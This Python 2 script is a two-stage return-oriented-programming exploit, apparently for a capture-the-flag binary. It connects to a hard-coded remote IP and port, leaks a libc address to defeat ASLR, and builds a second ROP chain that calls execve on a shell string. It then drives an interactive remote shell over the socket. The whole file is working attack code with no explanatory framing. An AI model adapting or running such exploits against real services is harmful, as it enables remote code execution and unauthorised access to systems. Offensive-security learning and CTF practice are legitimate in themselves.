#!/usr/bin/env python

import struct
from time import sleep
import sys
from subprocess import *
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import signal
import socket

#Pre-calculated positions based on debugging binary
#libc base 0x00007ffff7a3c000
#libc stdin 0x00007ffff7dd38c0
#libc.so.6 execve offset 0x3f384
libc_stdin_distance  = 0x3978c0
libc_poprdx_distance = 0x1b92
libc_system_distance = 0x3f480
libc_execve_distance = 0x3f384
offset_filename = 0x85c2667

def enable_sigpipe():

    signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
    for sig in signals:
        if hasattr(signal, sig):
            signal.signal(getattr(signal, sig), signal.SIG_DFL)

def str_to_lendian(shellcode_str):
	shellcode_str = shellcode_str[::-1]
	shellcode_str = shellcode_str.encode('hex')
	shellcode_str = int(shellcode_str,16)
	return shellcode_str

def build_bytes(rop_obj):
	if type(rop_obj) is list:

		shellcode_list = [ struct.pack('<Q', i) for i in rop_obj]
		return ''.join(shellcode_list)

	elif type(rop_obj) is str:
		shellcode_str = str_to_lendian(string)
		return struct.pack('<Q',shellcode_str)


roplist1 = []
roplist1.append(0x0000000000000100) #<--- rid ptr on first loop
roplist1.append(0x0000000000000000) #junk
roplist1.append(0x0000000000000001) #junk
roplist1.append(0x0000000000000001) #junk
roplist1.append(0x0000000000601050) #junk
roplist1.append(0x0000000000601050) #junk
roplist1.append(0x0000000000601050) #junk
roplist1.append(0x0000000000601050) #junk
roplist1.append(0x00000000006010f0) # ret <--- rbp on first loop / pushed as rtn ptr
roplist1.append(0x0000000000400626) # loop back to start 
roplist1.append(0x00000000004006d3) # pop rdi
roplist1.append(0x0000000000601060) #
roplist1.append(0x000000000040063a) #puts
roplist1.append(0x00000000004006d1) # pop rsi, pop r15 ; ret
roplist1.append(0x0000000000000000) #junk
roplist1.append(0x00007ffff7a7b480) # <--- system syscall

ropchain1 = build_bytes(roplist1)

host = "88.198.233.174"
port = 44622

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.setblocking(0)
s.connect((host, port))

data = s.recv(1024)
sleep(2)
banner = "ROP me outside, how 'about dah?\n"

if data == banner:
	print "[+] Received banner."
	#raw_input("[+] Press enter to continue. ")

print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(ropchain1)
s.sendall(ropchain1+"\n")

data = s.recv(1024)
if data == banner:

	print "[+] Succesfully sent that shit back into a loop."

s.sendall("\n")

print "[*] Reading address leak..."

sleep(3)
response_list = []
output = s.recv(6)

for i in output:
	response_list.append(hex(ord(i)))

response_list = response_list[::-1]

stdin_memory_leak = int(''.join([i[2:] for i in response_list]), 16)

print "[+] Memory leak at %s." % hex(stdin_memory_leak)
print "[*] Doin' math 'n' shit..."

libc_base = stdin_memory_leak - libc_stdin_distance
print "\t[+] Libc base at addr: %s" % hex(libc_base)

libc_pop_rdx = libc_base + libc_poprdx_distance
print "\t[+] Pop rdx gadget at addr: %s" % hex(libc_pop_rdx)
system_sys_call = libc_base + libc_system_distance
execve_sys_call = libc_base + libc_execve_distance
print "\t[+] System syscall gadget at addr: %s" % hex(execve_sys_call)

ptr_filename = libc_base + offset_filename

#Start build of second stage ROP shellcode
print "[*] Building ze stage 2 ROP gadgets..."
sleep(1)

shellcode1 = str_to_lendian("chroot  ")
shellcode2 = str_to_lendian("hatadoor")
shellcode3 = str_to_lendian(" /bin/sh")
#shellcode4 = str_to_lendian("nc 127.0")

roplist2 = []
roplist2.append(shellcode1) 			# <---- 0x6010b0 
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x4141414141414141) #
roplist2.append(0x00000000004006d3) # pop rdi; ret <---- rbp on heap
roplist2.append(0x00000000006010b0) # shellcode  string at 0x6010b0 execve_sys_call
roplist2.append(0x000000000040063a) # puts
roplist2.append(0x00000000004006d1) # pop rsi; pop r15; ret
roplist2.append(0x00000000006010b0) # clear reg
roplist2.append(0x0000000000000000) # clear reg
roplist2.append(libc_pop_rdx)
roplist2.append(0x0000000000000000) # clear reg
roplist2.append(execve_sys_call)	# pop dat shell

ropchain2 = build_bytes(roplist2)


print "[+] Sending second stage."
s.sendall(ropchain2+"\n")

# print "[+] Reading mem leak 2"
# sleep(3)
# response_list = []
# output = s.recv(40)

# for i in output:
# 	response_list.append(hex(ord(i)))

# response_list = response_list[::-1]

# #stack_memory_leak = int(''.join([i[2:] for i in response_list]), 16)

# print "[+] Memleak at: " + hex(ptr_filename) + " --> " + str(response_list)

#Switch to non-blocking read

while True:
	sleep(.5)
	output = s.recv(2048)
	print output
	shell_command = raw_input("# ")
	s.sendall(shell_command+"\n")	
	if shell_command.lower() == "quit" or shell_command.lower() == "exit":
		s.close()
		break
	sleep(.5)
	#print str(([hex(ord(i)) for i in output])[::-1])
	#print str(([hex(ord(i)) for i in output]))


